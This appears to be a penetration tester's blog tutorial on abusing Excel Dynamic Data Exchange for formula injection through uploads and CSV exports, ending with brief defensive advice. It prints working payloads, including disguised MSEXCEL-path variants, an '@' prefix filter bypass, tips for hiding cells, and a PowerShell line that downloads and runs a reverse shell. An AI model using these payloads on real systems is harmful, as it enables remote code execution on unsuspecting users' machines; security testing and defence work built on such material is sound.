---
layout: page
sidebar: right
subheadline: 'Pentesting'
title:  "Living Off the Land With DDE"
teaser: "A pen tester's guide to using native Windows programs and tools, specifically  Dynamic Data Exchange (DDE), to excel in your next PenTest!"
breadcrumb: true
categories:
    - infosec
tags:
    - blog
    - infosec
    - post
    - pentesting
    - office
    - windows
image:
    thumb: lol-dde/DDE-Excel2.png
    title: lol-dde/DDE-Excel2.png
---

I'm a huge fan of living off the land when it comes to hacking and working my way through a network. There are few things that feel better than taking a perfectly reasonable tool and flipping it inside out for my own benefit.

Recently, I was working on a penetration test for a web application, and I found a file upload function that allowed users to upload and download Excel files. The first thing that came across my mind - macros. But when I tried to upload a macro-enabled xlsm file, I was denied.

So I started hunting for other ways to exploit within file uploads. I knew about weaponized PDFs and other run-of-the-mill methods, but those seemed boring, and I was trying to be a little more original. I thought to myself, "It would be Excel-ent to be able to do this without macros..." 

        (•_•)               ( •_•)>⌐■-■            (⌐■_■)

Like most professionals, I realized I knew nothing and went to Google for help. I searched for how to load a payload into an excel without macros, expecting nothing, and was surprised to find my new favorite “feature” (keep reading) - Dynamic Data Exchange.
# Dynamic Data What Now?
According to Wikipedia, Dynamic Data Exchange (DDE) was first introduced in 1987 as a method to share data between applications in such as way that if it was updated in one, it would be updated in the other. Sounds great right? Well as it turns out, application and network security practices were not as important in 1987 as they are today - and that's saying something.

Microsoft implements DDE within its Office suite of applications to allow the transfer of data in a variety of ways. As a matter of fact, it’s still documented on microsoft.com as a feature included with Office ["for one-time data transfers and for continuous exchanges in which applications send updates to one another as new data becomes available."](https://docs.microsoft.com/en-us/windows/desktop/dataxchg/about-dynamic-data-exchange)

The basic idea is that you can have a spreadsheet or document that subscribes to an outside data source and automatically updates when changes occur. In theory, that sounds very helpful and is probably very useful in financial or medical spaces. However, there is a dark side to this force.
# Living Off the Land with DDE
As it turns out, DDE commands can execute just about any program - not to sugar coat it too much. Worse still, they can mask what programs they are executing. To a user opening an Excel document, nothing really looks out of the ordinary.

Even with the warning messages that Microsoft now forces them to display before they run, a typical user will probably do what they always do and click right on through. More than likely they downloaded the document from a trusted source.

What might be the worst part about this whole attack vector, though, is that this feature is built into every modern version of Office. Virtually every desktop computer running in an office can be exploited by DDE, and if it's done correctly, the user probably won't even know.
# So How Do You Do It?
As I mentioned above, DDE is a feature built into Microsoft Office, meaning it can be used within Word, Excel, and other applications. This article will focus on Excel, but vectors have been discovered for using the same principles in the other Office programs like Word and Outlook as well.

Starting off in the most basic and benign way possible, I will show how to use a DDE payload in Excel to open a calculator.
<figure style="text-align:center; margin:1em">
<img src="/resources/content/images/2018/12/calc-cmd.gif" alt="DDE-Calc">
<figcaption style="font-size:small">
 =CMD|'/c calc.exe'!'a1'
</figcaption>
</figure>

# Let's Break This Down
When Excel comes across a '=' it knows to evaluate the contents of the cell. Normally, this is used to add something or run a built-in Excel function, but DDE allows a user to run any executable. One such function that is allowed by default is cmd. By using cmd, the following arguments take the same set of options as a standard Windows command prompt. I used '/c' in this example to run the program called and then terminate the promp, but you could use ‘/k’ to leave the shell running if you wanted to. After that, it's just a matter of picking a program like calc.exe and finishing the DDE syntax for Excel.
# Let's Make This Sneakier
So that payload will let you run just about anything installed on the computer (actually…really anything), but a warning will pop up asking the user if they want to run CMD.EXE. That's not exactly the friendliest warning - even though people just say ok to pop-ups anyway. But we can do better.
<figure style="text-align:center; margin:1em">
<img src="/resources/content/images/2018/12/dde-calc-obfuscated.gif" alt="DDE-Calc">
<figcaption style="font-size:small">
=MSEXCEL|'..\..\..\..\Windows\system32\cmd.exe /c calc.exe'!'a1'
</figcaption>
</figure>

This doesn't do anything different, except now the warning message asks to run MSEXCEL.EXE. Well, of course the user wants to run MSEXCEL.EXE - that's what they clicked on in the first place. The rest of the payload just brings the exploit back to using cmd.exe with the same options as before, and a new calculator is born!

In addition, feel free to hide the cell in the spreadsheet. When these payloads execute, they tend to leave behind a reference error. A hidden field (maybe in the 1000th row) won't draw as much attention if a spreadsheet is loaded with a bunch of decoy data.
# Let's Make This Scarier
So now we basically have a well-hidden payload that opens a calculator...yay. But if you remember, DDE can be used to run any command. In the spirit of continuing to live off the land, let's try PowerShell.

<figure style="text-align:center; margin:1em">
<img src="/resources/content/images/2018/12/dde-shell-obfuscated.gif">
<figcaption style="font-size:small">
=MSEXCEL|'..\..\..\..\Windows\system32\cmd.exe /c powershell.exe $e=(New-Object System.Net.WebClient).DownloadString(\"http://127.0.0.1/revshell.ps1\");powershell $e'!'a1'
</figcaption>
</figure>


Nice. A one-line PowerShell script to download what appears to be a reverse shell and execute it. This particular script will open a PowerShell window, but adding '-windowstyle hidden' should take care of that, and frankly the damage is already done.  Plus, we still haven't used anything that Microsoft didn’t give us for free (er…“free”). That isn't to say we couldn't. We can download anything and run it.

<figure style="text-align:center; margin:1em">
<img src="/resources/content/images/2018/12/dde-chrome-obfuscated.gif">
<figcaption style="font-size:small">
=MSEXCEL|'..\..\..\..\Windows\system32\cmd.exe /c "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"'!'a1'
</figcaption>
</figure>

# Let's Make This More Flexible
In some cases, the payloads above won't work. For example, I once tried to use DDE in a CSV export function (by the way...this works for any type of file that can be opened in Excel) that took user input and sent it to a file that can be saved to a user's machine. I saved the payload into the application, but when I downloaded the CSV, the '=' was removed. It looked like game over, but guess what.

What?

It wasn’t.
 
<figure style="text-align:center; margin:1em">
<img src="/resources/content/images/2018/12/dde-calc-with-at-sign.gif">
<figcaption style="font-size:small">
@SUM(cmd|'/c calc.exe'!a1)
</figcaption>
</figure>

Turns out, the '@' sign is a valid evaluation prefix as well. The same rules apply as all the previous payloads. The initial CMD can be replaced by MSEXCEL, and feel free to go beyond the dreaded calculator.
# Defend Yourselves
The best way to defend against malicious DDE payloads is to limit the types of files that can be uploaded to only the most necessary for your workflow. If you don't need Excel-style files, don't allow them - even if macros are disabled.

Additionally, applications that export user-defined fields to Excel-friendly files should not allow DDE payloads as input. This means filtering '=' and '@' for sure, but really anything that falls outside the scope of the application's requirements.  If you NEED to use ‘=’ and ‘@’ at the beginning of a text field I suppose you can add a single quote to the front of the value when it’s exported.  Doing so will keep Office from evaluating what comes next.  But you probably don’t NEED them anyway – unless you are promoting a twitter handle (say for example, [@_hansonet_](https://twitter.com/_hansonet_)).
# Final Notes
The most surprising thing about this particular security issue is that I had never heard of it before. Between classes, conversations, and conventions, I had never heard anyone even mention what I believe is a fairly effective, and dangerous security hole. Apart from a couple of very recent blog posts, there wasn't much to go off of, but a lot to be gained by looking into DDE.

DDE is a feature, not likely to go away any time soon. At the time of this writing, Microsoft has disabled automatic execution and presents a warning prompt, but how often does depending on user work as an effective defense? The only real defense is to limit file uploads, inspect file content, and filter user input.  Enjoy, and leave a comment if you’ve had any personal success with this!
